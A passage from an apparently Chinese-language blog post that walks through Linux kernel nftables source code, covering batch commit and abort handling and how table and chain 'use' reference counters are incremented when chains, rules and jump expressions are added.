class="keyword">const</span> struct nlattr **)cda);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The lock was released to autoload some module, we</span></span><br><span class="line"><span class="comment"> * have to abort and start from scratch using the</span></span><br><span class="line"><span class="comment"> * original skb.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (err == -EAGAIN) &#123;</span><br><span class="line">status |= NFNL_BATCH_REPLAY;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ack:</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_ACK || err) &#123;</span><br><span class="line"><span class="comment">/* Errors are delivered once the full batch has been</span></span><br><span class="line"><span class="comment"> * processed, this avoids that the same error is</span></span><br><span class="line"><span class="comment"> * reported several times when replaying the batch.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (err == -ENOMEM ||</span><br><span class="line">    nfnl_err_add(&amp;err_list, nlh, err, &amp;extack) &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* We failed to enqueue an error, reset the</span></span><br><span class="line"><span class="comment"> * list of errors and send OOM to userspace</span></span><br><span class="line"><span class="comment"> * pointing to the batch header.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">netlink_ack(oskb, nlmsg_hdr(oskb), -ENOMEM,</span><br><span class="line">    <span class="literal">NULL</span>);</span><br><span class="line">status |= NFNL_BATCH_FAILURE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We don&#x27;t stop processing the batch on errors, thus,</span></span><br><span class="line"><span class="comment"> * userspace gets all the errors that the batch</span></span><br><span class="line"><span class="comment"> * triggers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line">status |= NFNL_BATCH_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">msglen = NLMSG_ALIGN(nlh-&gt;nlmsg_len);</span><br><span class="line"><span class="keyword">if</span> (msglen &gt; skb-&gt;len)</span><br><span class="line">msglen = skb-&gt;len;</span><br><span class="line">skb_pull(skb, msglen);</span><br><span class="line">&#125;</span><br><span class="line">done:</span><br><span class="line"><span class="keyword">if</span> (status &amp; NFNL_BATCH_REPLAY) &#123;</span><br><span class="line">ss-&gt;<span class="built_in">abort</span>(net, oskb, NFNL_ABORT_AUTOLOAD);</span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">kfree_skb(skb);</span><br><span class="line">module_put(ss-&gt;owner);</span><br><span class="line"><span class="keyword">goto</span> replay;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (status == NFNL_BATCH_DONE) &#123;</span><br><span class="line">err = ss-&gt;commit(net, oskb);</span><br><span class="line"><span class="keyword">if</span> (err == -EAGAIN) &#123;</span><br><span class="line">status |= NFNL_BATCH_REPLAY;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (err) &#123;</span><br><span class="line">ss-&gt;<span class="built_in">abort</span>(net, oskb, NFNL_ABORT_NONE);</span><br><span class="line">netlink_ack(oskb, nlmsg_hdr(oskb), err, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">enum</span> nfnl_abort_action abort_action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (status &amp; NFNL_BATCH_FAILURE)</span><br><span class="line">abort_action = NFNL_ABORT_NONE;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">abort_action = NFNL_ABORT_VALIDATE;</span><br><span class="line"></span><br><span class="line">err = ss-&gt;<span class="built_in">abort</span>(net, oskb, abort_action);</span><br><span class="line"><span class="keyword">if</span> (err == -EAGAIN) &#123;</span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">kfree_skb(skb);</span><br><span class="line">module_put(ss-&gt;owner);</span><br><span class="line">status |= NFNL_BATCH_FAILURE;</span><br><span class="line"><span class="keyword">goto</span> replay_abort;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nfnl_err_deliver(&amp;err_list, oskb);</span><br><span class="line">kfree_skb(skb);</span><br><span class="line">module_put(ss-&gt;owner);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数在<a href="https://196082.github.io/2024/08/17/nftables/">nftables子系统浅分析</a>大概介绍过，不过在那篇文章主要介绍的是如何找到对应的子系统的过程，下面的内容是没怎么介绍。可以看到done分支中当status为<code>NFNL_BATCH_DONE</code>时就会调用commit了，如果commit发生错误就会调用abort，或者是status不仅为<code>NFNL_BATCH_DONE</code>则会进入else分支调用abort。</p><h3 id="常见结构体"><a href="#常见结构体" class="headerlink" title="常见结构体"></a>常见结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct nft_table - nf_tables table</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *@list: used internally</span></span><br><span class="line"><span class="comment"> *@chains_ht: chains in the table</span></span><br><span class="line"><span class="comment"> *@chains: same, for stable walks</span></span><br><span class="line"><span class="comment"> *@sets: sets in the table</span></span><br><span class="line"><span class="comment"> *@objects: stateful objects in the table</span></span><br><span class="line"><span class="comment"> *@flowtables: flow tables in the table</span></span><br><span class="line"><span class="comment"> *@hgenerator: handle generator state</span></span><br><span class="line"><span class="comment"> *@handle: table handle</span></span><br><span class="line"><span class="comment"> *@use: number of chain references to this table</span></span><br><span class="line"><span class="comment"> *@flags: table flag (see enum nft_table_flags)</span></span><br><span class="line"><span class="comment"> *@genmask: generation mask</span></span><br><span class="line"><span class="comment"> *@afinfo: address family info</span></span><br><span class="line"><span class="comment"> *@name: name of the table</span></span><br><span class="line"><span class="comment"> *@validate_state: internal, set when transaction adds jumps</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rhltable</span><span class="title">chains_ht</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">chains</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">sets</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">objects</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">flowtables</span>;</span></span><br><span class="line">u64hgenerator;</span><br><span class="line">u64handle;</span><br><span class="line">u32use;</span><br><span class="line">u16family:<span class="number">6</span>,</span><br><span class="line">flags:<span class="number">8</span>,</span><br><span class="line">genmask:<span class="number">2</span>;</span><br><span class="line">u32nlpid;</span><br><span class="line"><span class="keyword">char</span>*name;</span><br><span class="line">u16udlen;</span><br><span class="line">u8*udata;</span><br><span class="line">u8validate_state;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如上是<code>nft_table</code>结构体，这里关注其use成员，其含义为有多少chain引用此table。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct nft_chain - nf_tables chain</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *@rules: list of rules in the chain</span></span><br><span class="line"><span class="comment"> *@list: used internally</span></span><br><span class="line"><span class="comment"> *@rhlhead: used internally</span></span><br><span class="line"><span class="comment"> *@table: table that this chain belongs to</span></span><br><span class="line"><span class="comment"> *@handle: chain handle</span></span><br><span class="line"><span class="comment"> *@use: number of jump references to this chain</span></span><br><span class="line"><span class="comment"> *@flags: bitmask of enum nft_chain_flags</span></span><br><span class="line"><span class="comment"> *@name: name of the chain</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_rule_blob</span>__<span class="title">rcu</span> *<span class="title">blob_gen_0</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_rule_blob</span>__<span class="title">rcu</span> *<span class="title">blob_gen_1</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">rules</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rhlist_head</span><span class="title">rhlhead</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span>*<span class="title">table</span>;</span></span><br><span class="line">u64handle;</span><br><span class="line">u32use;</span><br><span class="line">u8flags:<span class="number">5</span>,</span><br><span class="line">bound:<span class="number">1</span>,</span><br><span class="line">genmask:<span class="number">2</span>;</span><br><span class="line"><span class="keyword">char</span>*name;</span><br><span class="line">u16udlen;</span><br><span class="line">u8*udata;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used during control plane commit phase: */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_rule_blob</span>*<span class="title">blob_next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里的<code>nft_chain</code>结构体中的use成员的含义为有多少条转到了此chain。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_addchain</span><span class="params">(struct nft_ctx *ctx, u8 family, u8 genmask,</span></span></span><br><span class="line"><span class="params"><span class="function">      u8 policy, u32 flags,</span></span></span><br><span class="line"><span class="params"><span class="function">      struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> * <span class="title">const</span> *<span class="title">nla</span> =</span> ctx-&gt;nla;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span> =</span> ctx-&gt;table;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_base_chain</span> *<span class="title">basechain</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> ctx-&gt;net;</span><br><span class="line"><span class="keyword">char</span> name[NFT_NAME_MAXLEN];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_rule_blob</span> *<span class="title">blob</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="comment">// .......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nft_use_inc(&amp;table-&gt;use)) &#123;</span><br><span class="line">err = -EMFILE;</span><br><span class="line"><span class="keyword">goto</span> err_use;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述为chain的添加函数，可以看到每添加一个chain就会增加一次table的use成员。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newrule</span><span class="params">(struct sk_buff *skb, <span class="keyword">const</span> struct nfnl_info *info,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nftables_pernet</span> *<span class="title">nft_net</span> =</span> nft_pernet(info-&gt;net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_ext_ack</span> *<span class="title">extack</span> =</span> info-&gt;extack;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size, i, n, ulen = <span class="number">0</span>, usize = <span class="number">0</span>;</span><br><span class="line">u8 genmask = nft_genmask_next(info-&gt;net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_rule</span> *<span class="title">rule</span>, *<span class="title">old_rule</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_info</span> *<span class="title">expr_info</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">u8 family = info-&gt;nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_flow_rule</span> *<span class="title">flow</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> info-&gt;net;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_userdata</span> *<span class="title">udata</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span>;</span></span><br><span class="line">u64 handle, pos_handle;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tmp</span>;</span></span><br><span class="line"><span class="keyword">int</span> err, rem;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">rule = kzalloc(<span class="keyword">sizeof</span>(*rule) + size + usize, GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (rule == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err_release_expr;</span><br><span class="line"></span><br><span class="line">nft_activate_next(net, rule);</span><br><span class="line"></span><br><span class="line">rule-&gt;handle = handle;</span><br><span class="line">rule-&gt;dlen   = size;</span><br><span class="line">rule-&gt;udata  = ulen ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ulen) &#123;</span><br><span class="line">udata = nft_userdata(rule);</span><br><span class="line">udata-&gt;len = ulen - <span class="number">1</span>;</span><br><span class="line">nla_memcpy(udata-&gt;data, nla[NFTA_RULE_USERDATA], ulen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">expr = nft_expr_first(rule);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">err = nf_tables_newexpr(&amp;ctx, &amp;expr_info[i], expr);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, expr_info[i].attr);</span><br><span class="line"><span class="keyword">goto</span> err_release_rule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (expr_info[i].ops-&gt;validate)</span><br><span class="line">nft_validate_state_update(table, NFT_VALIDATE_NEED);</span><br><span class="line"></span><br><span class="line">expr_info[i].ops = <span class="literal">NULL</span>;</span><br><span class="line">expr = nft_expr_next(expr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain-&gt;flags &amp; NFT_CHAIN_HW_OFFLOAD) &#123;</span><br><span class="line">flow = nft_flow_rule_create(net, rule);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(flow)) &#123;</span><br><span class="line">err = PTR_ERR(flow);</span><br><span class="line"><span class="keyword">goto</span> err_release_rule;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nft_use_inc(&amp;chain-&gt;use)) &#123;</span><br><span class="line">err = -EMFILE;</span><br><span class="line"><span class="keyword">goto</span> err_release_rule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// .......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_destroy_flow_rule:</span><br><span class="line">nft_use_dec_restore(&amp;chain-&gt;use);</span><br><span class="line"><span class="keyword">if</span> (flow)</span><br><span class="line">nft_flow_rule_destroy(flow);</span><br><span class="line">err_release_rule:</span><br><span class="line">nft_rule_expr_deactivate(&amp;ctx, rule, NFT_TRANS_PREPARE_ERROR);</span><br><span class="line">nf_tables_rule_destroy(&amp;ctx, rule);</span><br><span class="line">err_release_expr:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (expr_info[i].ops) &#123;</span><br><span class="line">module_put(expr_info[i].ops-&gt;type-&gt;owner);</span><br><span class="line"><span class="keyword">if</span> (expr_info[i].ops-&gt;type-&gt;release_ops)</span><br><span class="line">expr_info[i].ops-&gt;type-&gt;release_ops(expr_info[i].ops);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">kvfree(expr_info);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述为rule的申请函数可以看到虽然在内核注释中写的use成员的含义为跳转到此chain的个数但是实际申请一个rule也会对use进行加一操作。</p><p>这里再关注一下注释所写的跳转吧。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_immediate_init</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nft_expr *expr,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> tb[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_immediate_expr</span> *<span class="title">priv</span> =</span> nft_expr_priv(expr);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_data_desc</span> <span class="title">desc</span> =</span> &#123;</span><br><span class="line">.size= <span class="keyword">sizeof</span>(priv-&gt;data),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tb[NFTA_IMMEDIATE_DREG] == <span class="literal">NULL</span> ||</span><br><span class="line">    tb[NFTA_IMMEDIATE_DATA] == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">desc.type = nft_reg_to_type(tb[NFTA_IMMEDIATE_DREG]);</span><br><span class="line">err = nft_data_init(ctx, &amp;priv-&gt;data, &amp;desc, tb[NFTA_IMMEDIATE_DATA]);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">priv-&gt;dlen = desc.len;</span><br><span class="line"></span><br><span class="line">err = nft_parse_register_store(ctx, tb[NFTA_IMMEDIATE_DREG],</span><br><span class="line">       &amp;priv-&gt;dreg, &amp;priv-&gt;data, desc.type,</span><br><span class="line">       desc.len);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (priv-&gt;dreg == NFT_REG_VERDICT) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span> =</span> priv-&gt;data.verdict.chain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (priv-&gt;data.verdict.code) &#123;</span><br><span class="line"><span class="keyword">case</span> NFT_JUMP:</span><br><span class="line"><span class="keyword">case</span> NFT_GOTO:</span><br><span class="line">err = nf_tables_bind_chain(ctx, chain);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err1:</span><br><span class="line">nft_data_release(&amp;priv-&gt;data, desc.type);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码是immediate类型的expr的初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nft_data_init</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_data *data,</span></span></span><br><span class="line"><span class="params"><span class="function">  struct nft_data_desc *desc, <span class="keyword">const</span> struct nlattr *nla)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tb</span>[<span class="title">NFTA_DATA_MAX</span> + 1];</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(!desc-&gt;size))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">err = nla_parse_nested_deprecated(tb, NFTA_DATA_MAX, nla,</span><br><span class="line">  nft_data_policy, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tb[NFTA_DATA_VALUE]) &#123;</span><br><span class="line"><span class="keyword">if</span> (desc-&gt;type != NFT_DATA_VALUE)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">err = nft_value_init(ctx, data, desc, tb[NFTA_DATA_VALUE]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (tb[NFTA_DATA_VERDICT] &amp;&amp; ctx != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (desc-&gt;type != NFT_DATA_VERDICT)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">err = nft_verdict_init(ctx, data, desc, tb[NFTA_DATA_VERDICT]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(nft_data_init);</span><br></pre></td></tr></table></figure><p>随后调用<code>nft_data_init</code>函数对expr的data段做初始化，因为这里是做跳转操作所以tb的索引为<code>NFTA_DATA_VERDICT</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 